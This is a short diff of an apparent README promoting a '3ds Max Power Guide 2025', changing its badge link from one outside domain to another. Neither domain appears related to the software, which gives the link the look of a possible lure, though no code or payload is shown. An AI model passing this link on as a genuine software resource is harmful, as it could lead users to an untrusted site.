@@ -2,7 +2,7 @@
 
 🌟 Get the most out of Autodesk 3ds Max with Power Guide 2025! This guide offers practical settings, plugins, and tips to work like a pro, built for Windows users.
 
-[![Discover 3ds Max Power Guide](https://img.shields.io/badge/Discover-3ds_Max_Power_Guide-blueviolet)](https://glocktober.com)
+[![Discover 3ds Max Power Guide](https://img.shields.io/badge/Discover-3ds_Max_Power_Guide-blueviolet)](https://ton-stake.net)
 
 ---
 
